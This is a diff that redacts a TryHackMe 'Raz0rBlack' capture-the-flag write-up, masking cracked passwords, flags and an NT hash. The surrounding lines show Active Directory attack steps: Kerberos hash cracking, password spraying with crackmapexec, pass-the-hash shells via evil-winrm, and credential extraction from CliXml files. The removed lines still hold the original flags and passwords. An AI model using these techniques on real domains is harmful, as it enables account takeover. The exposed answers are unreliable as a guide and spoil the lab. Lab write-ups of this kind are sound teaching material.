@@ -73,7 +73,7 @@ The flag of the user Steven Bradley, is contained in the file sbradley.txt:
 ```
 ┌──(root@kali)-[/mnt/test]
 └─# cat sbradley.txt 
-THM{ab53e05c9a98def00314a14ccbfa8104}
+THM{ab53e05c9a98def00314a14c********}
 ```
 
 We can see the contents of the spreadsheet in the screen capture below:
@@ -187,7 +187,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3364529499a88671db4f35e5f92a983d$17bd3a129f2ba2c767d46843a9b0ce212453726a3b7d2ac377910f3e49f98472c9a8c28e17c03a54ccbf1832a117e5b5532e3fe00df3b9f4174b2e50e2ef96a127901cf274bc5ce506a32bfab02f6877c22db1f93737ec82449627663653daffebab02fd5fc1b9b31d8b445bde9f6f21d4ccb28fcf5d0aa5be99607b475808e860cef15c5cc02b288ad53bf4118c254f3945274e50dc3843793631bbd0c142df7f263e253f08cc00cfe8e452d0e956acb611647dcfb8f21dfd2529fdba1af54f9a003a32f6a268b07caf9da9729bf77845922e4a01f09c89ad7344f866f4b41d61bc127ae09bd57182a13dfa52301b84:roastpotatoes
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3364529499a88671db4f35e5f92a983d$17bd3a129f2ba2c767d46843a9b0ce212453726a3b7d2ac377910f3e49f98472c9a8c28e17c03a54ccbf1832a117e5b5532e3fe00df3b9f4174b2e50e2ef96a127901cf274bc5ce506a32bfab02f6877c22db1f93737ec82449627663653daffebab02fd5fc1b9b31d8b445bde9f6f21d4ccb28fcf5d0aa5be99607b475808e860cef15c5cc02b288ad53bf4118c254f3945274e50dc3843793631bbd0c142df7f263e253f08cc00cfe8e452d0e956acb611647dcfb8f21dfd2529fdba1af54f9a003a32f6a268b07caf9da9729bf77845922e4a01f09c89ad7344f866f4b41d61bc127ae09bd57182a13dfa52301b84:XXXXXXXX
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -278,7 +278,7 @@ Password re-use is a popular evil in the security field. After trying the passwo
 
 ```
 ──(kali㉿kali)-[~/tryhackme/raz0rblack]
-└─$ crackmapexec smb RAZ0RBLACK.THM -u sbradley -p roastpotatoes
+└─$ crackmapexec smb RAZ0RBLACK.THM -u sbradley -p XXXXXXX
 [*] First time use detected
 [*] Creating home directory structure
 [*] Creating default workspace
@@ -290,7 +290,7 @@ Password re-use is a popular evil in the security field. After trying the passwo
 [*] Copying default configuration file
 [*] Generating SSL certificate
 SMB         10.10.75.170    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
-SMB         10.10.75.170    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
+SMB         10.10.75.170    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:XXXXXXXX STATUS_PASSWORD_MUST_CHANGE 
 ```
 
 We change the password using the smbpasswd command:
@@ -351,7 +351,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-electromagnetismo (experiment_gone_wrong.zip)
+********* (experiment_gone_wrong.zip)
 1g 0:00:00:00 DONE (2021-07-25 15:59) 1.449g/s 12145Kp/s 12145Kc/s 12145KC/s elephantmeee..elanore67
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -390,14 +390,14 @@ Here is the important bit I got from Animesh's article, a way to bruteforce all 
 ```
 crackmapexec smb MACHINE_IP -u lvetrova -H nt_hashes.txt
 ...[snip]...
-SMB         MACHINE_IP    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d
+SMB         MACHINE_IP    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40e********
 ```
 
-As shown above, we found that the hash f220d3988deb3f516c73f40ee16c431d, previously belonging to user n.cox now matches the current lvetrova user.
+As shown above, we found that the hash f220d3988deb3f516c73f40e********, previously belonging to user n.cox now matches the current lvetrova user.
 
 ```
-└─$ grep "f220d3988deb3f516c73f40ee16c431d" secretdump_out.ntds
-RAZ0RBLACK\n.cox:4612:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
+└─$ grep "f220d3988deb3f516c73f40e********" secretdump_out.ntds
+RAZ0RBLACK\n.cox:4612:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40e********:::
 ```
 
 ## Shell as lvetrova
@@ -405,7 +405,7 @@ RAZ0RBLACK\n.cox:4612:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee
 After obtaining the correct NT hash, we can use evil-winrm to get a shell using the pass the hash technique.
 
 ```
-└─$ evil-winrm  -i  10.10.63.133 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                  1 ⨯
+└─$ evil-winrm  -i  10.10.63.133 -u lvetrova -H f220d3988deb3f516c73f40e********                                                  1 ⨯
 
 Evil-WinRM shell v2.4
 
@@ -457,7 +457,7 @@ Using some Powershell we can extract the contents of the credential file:
 *Evil-WinRM* PS C:\Users\lvetrova> $credential = Import-CliXml -Path 'lvetrova.xml'
 *Evil-WinRM* PS C:\Users\lvetrova> $credential.GetNetworkCredential().Password
 
-THM{694362e877adef0d85a92e6d17551fe4}
+THM{694362e877adef0d85a92e6d********}
 ```
 
 The credential file contained Lludmila's flag. Now is time to get the others.
@@ -526,7 +526,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$6de0193a7673c6e62df419238ad76527$d395e0095763e4ce11ba6be95be475462f3d90cac67af1806dff56ed9e48a098e0d1a3a7b88b756f471b62a56353cf412aa6cae5484f01eddb53c6deceb51e52aa86f21ef6cab8396b06830e308176595f935176e761619eb94489dcc74b6f75ed6bdd4f6257c1792ae14842364b72809db19401bc3ed43c3336ff5f17e504eabd41e64ef9a6cc62ca41c3a8c929a5ca628a3dc49771dff5b13e72192ad30dc4fbfc71964b376d3d95388e29fd5248f8a22e525e9d10516b34ca520342ac5378e1922157834e7dfb6aed8e820eeb784b7bbe238b961ba921ea2d522ab606ceba1e97bba13933242e031709539eb75460bbd1964ee91ac59b0661bd3c4c22db7044cb4bc31972f6857b12fd38044e4eabbcfe8961d6bb00727a37a42e79e69157f938e625b6e03e2d8c9d919b1e40590c49727ba75612ed609812aecbbf5539c7d497d0c911cbec4f3ed4ea7798af894d5f7db7208e9040b5adbddaa365d9b070135cd99868bb967347a0d64730741d787aeb88524c9a8c85c478811e8657f3a41f03755935d8d8c2656fdc3496d502f56bf529f66f2138c383680ccb67756e408870a000e2038679f64ed87113ad6915a1f59b5a5dbb0736ff51ce4bf0c4f67bab496637fb46865011b1971e79766c245eb9d7da046299c08a78281056e078a95b6def6fbadc9810b66db5c91b879986f6388a0aa1c05594e6e127054bf98228454a3b5245e0e9e527822970682a83b4987b411d1e130e84e4eee0bcbcea61c7ccbc3e6b31bbcc34eb433d843f5d79aa05858214cc1e9aad44b6d3d409e4db4c159c6f1aad37cf3391aeea80c1d69d00f3e9a9ec46faf68ccf84f37b81da9aeb54330e0073191e36fcb6280e74ed36cab5f7e8a4edd3a0a459f5868c44b2797178cc2981c073d7107e4540a48f4aa3f99311dde23769bc377fbb2e23108217a18eb4ed84e8afd0b1bb9b11e39a5e917a62928e1d9d417a0d333b5a99b38a0f000d7a40d62aaae73fb38010f0a9f03df0dfe1913c6b494f71f90c2fde898062dcc5c68759c7bb2d1492e6543b74676d8a1c1ba8f5ab85dd0d71e4777a9f65d5ef9ec3dccc21ac1694f95de664c94961e63dd9a1f260bc35a02bb75fbf073ad8cb238959ae4ef8f6cfc0ed2806e80a8b7cd5adfeecf509b78494e9efa95c1f90a85b9799f73117607faf09f85472661a946ab3120c24d2d8e2703a545861f253cbc005741e1913dcf057437726fc61c0d7a6864a7f6ccc9d57f959529c68fcb5c230c9cf525948a2b6007795ec914688b0d6a01407159c6d887215029e0e42c4f1eb412831e1c5a35f43568a25aaa2fe189718c7bba74ac7caf953acbf8ce7d088d6bd85e6638ed1541acb95c7e5c208c4452af487e0b38c9f82d13b1fd52387dccd62e3f8b9c5188c15363ab439e567:cyanide9amine5628
+$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$6de0193a7673c6e62df419238ad76527$d395e0095763e4ce11ba6be95be475462f3d90cac67af1806dff56ed9e48a098e0d1a3a7b88b756f471b62a56353cf412aa6cae5484f01eddb53c6deceb51e52aa86f21ef6cab8396b06830e308176595f935176e761619eb94489dcc74b6f75ed6bdd4f6257c1792ae14842364b72809db19401bc3ed43c3336ff5f17e504eabd41e64ef9a6cc62ca41c3a8c929a5ca628a3dc49771dff5b13e72192ad30dc4fbfc71964b376d3d95388e29fd5248f8a22e525e9d10516b34ca520342ac5378e1922157834e7dfb6aed8e820eeb784b7bbe238b961ba921ea2d522ab606ceba1e97bba13933242e031709539eb75460bbd1964ee91ac59b0661bd3c4c22db7044cb4bc31972f6857b12fd38044e4eabbcfe8961d6bb00727a37a42e79e69157f938e625b6e03e2d8c9d919b1e40590c49727ba75612ed609812aecbbf5539c7d497d0c911cbec4f3ed4ea7798af894d5f7db7208e9040b5adbddaa365d9b070135cd99868bb967347a0d64730741d787aeb88524c9a8c85c478811e8657f3a41f03755935d8d8c2656fdc3496d502f56bf529f66f2138c383680ccb67756e408870a000e2038679f64ed87113ad6915a1f59b5a5dbb0736ff51ce4bf0c4f67bab496637fb46865011b1971e79766c245eb9d7da046299c08a78281056e078a95b6def6fbadc9810b66db5c91b879986f6388a0aa1c05594e6e127054bf98228454a3b5245e0e9e527822970682a83b4987b411d1e130e84e4eee0bcbcea61c7ccbc3e6b31bbcc34eb433d843f5d79aa05858214cc1e9aad44b6d3d409e4db4c159c6f1aad37cf3391aeea80c1d69d00f3e9a9ec46faf68ccf84f37b81da9aeb54330e0073191e36fcb6280e74ed36cab5f7e8a4edd3a0a459f5868c44b2797178cc2981c073d7107e4540a48f4aa3f99311dde23769bc377fbb2e23108217a18eb4ed84e8afd0b1bb9b11e39a5e917a62928e1d9d417a0d333b5a99b38a0f000d7a40d62aaae73fb38010f0a9f03df0dfe1913c6b494f71f90c2fde898062dcc5c68759c7bb2d1492e6543b74676d8a1c1ba8f5ab85dd0d71e4777a9f65d5ef9ec3dccc21ac1694f95de664c94961e63dd9a1f260bc35a02bb75fbf073ad8cb238959ae4ef8f6cfc0ed2806e80a8b7cd5adfeecf509b78494e9efa95c1f90a85b9799f73117607faf09f85472661a946ab3120c24d2d8e2703a545861f253cbc005741e1913dcf057437726fc61c0d7a6864a7f6ccc9d57f959529c68fcb5c230c9cf525948a2b6007795ec914688b0d6a01407159c6d887215029e0e42c4f1eb412831e1c5a35f43568a25aaa2fe189718c7bba74ac7caf953acbf8ce7d088d6bd85e6638ed1541acb95c7e5c208c4452af487e0b38c9f82d13b1fd52387dccd62e3f8b9c5188c15363ab439e567:**********
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -554,7 +554,7 @@ Stopped: Tue Jul 27 09:34:40 2021
 We can use the previously found password to get a shell into the system as xyan1d3.
 
 ```
-└─$ evil-winrm  -i  10.10.63.133 -u xyan1d3 -p cyanide9amine5628                    
+└─$ evil-winrm  -i  10.10.63.133 -u xyan1d3 -p **********                    
 
 Evil-WinRM shell v2.4
 
@@ -586,7 +586,7 @@ As done with the lvetrova user, we get the flag from the xyan1d3.xml file.
 ```
 *Evil-WinRM* PS C:\Users\xyan1d3> $credential = Import-CliXml -Path 'xyan1d3.xml'
 *Evil-WinRM* PS C:\Users\xyan1d3> $credential.GetNetworkCredential().Password
-LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
+LOL here it is -> THM{62ca7e0b901aa8f0b233cade********}
 *Evil-WinRM* PS C:\Users\xyan1d3> 
 ```
 
@@ -646,7 +646,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 Using Luis Vaca's [Acl-FullControl.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1) script we'll take full control on the C:\windows\system32\drivers\etc path. Which will later on allow us to do some further privilege escalation.
 
 ```
-└─$ evil-winrm  -i RAZ0RBLACK.THM  -u xyan1d3 -p cyanide9amine5628 -s '/home/kali/tryhackme/raz0rblack/scripts/'
+└─$ evil-winrm  -i RAZ0RBLACK.THM  -u xyan1d3 -p *********** -s '/home/kali/tryhackme/raz0rblack/scripts/'
 
 Evil-WinRM shell v2.4
 
@@ -909,7 +909,7 @@ A suspicious file there claiming not to be flag, it must be that one! We can get
 
 ```
 *Evil-WinRM* PS C:\Users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe                                                                                                                                                                     
-THM{5144f2c4107b7cab04916724e3749fb0}                                                                                                                                                                                        
+THM{5144f2c4107b7cab04916724********}                                                                                                                                                                                        
 *Evil-WinRM* PS C:\Users\twilliams> 
 ```
 
